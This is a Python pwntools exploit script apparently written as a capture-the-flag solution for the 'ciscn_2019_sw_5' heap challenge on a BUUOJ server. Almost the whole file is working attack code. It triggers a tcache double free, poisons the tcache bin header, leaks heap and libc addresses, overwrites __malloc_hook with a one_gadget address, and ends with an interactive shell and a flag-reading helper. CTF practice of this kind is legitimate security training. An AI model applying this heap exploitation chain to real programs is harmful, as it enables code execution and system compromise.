# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_2019_sw_5'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.27.so')
context.log_level = 'debug' 
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27409'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(title , content = 'a'):
    cmd(1)
    sa('title:' , title)
    sa('content:' , content)

def delete( idx ):
    cmd(2)
    sla('index:\n' , idx)

one_gad = one_gadget(libc.path)

def attack():
    
    add('0')
    add('1')
    add('2' , flat(0 , 0 , 0x61))

    #double free
    delete(0)
    delete(0)

    #攻击tcache bin表头
    add('\x1e\x90')
    rl()
    heap_base = uu64(6) & (0xFFFFFFFFFFFFFF00)
    lg('heap_base' , heap_base)

    add('4',flat( heap_base + 0x280 , heap_base + 0x268 , 0x101 , heap_base + 0x270 ))
    
    payload = p16( 0 ) + p64(0)*(6 + 5) + p64(heap_base + 0x280)
    add(p64(0xfff) , payload)
    add('\x70')

    delete(6)
    add('a'*0x8 , 'a'*0x8)

    __malloc_hook = l64() - 0x70
    lg('__malloc_hook',__malloc_hook)
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    ogg = one_gad[1] + libc.address

    add( p64(__malloc_hook) , p64(__malloc_hook)*3 )
    add( p64(ogg))
    add( p64(ogg))

    # cmd(1)
    # 此时 par 和 bin 查出来的结构稀烂
    # dbg()

    # p.success(getShell())
    p.interactive()

# exhaust(attack)
attack()

'''
@File    :   ciscn_2019_sw_5.py
@Time    :   2021/11/03 19:02:04
@Author  :   Niyah 
'''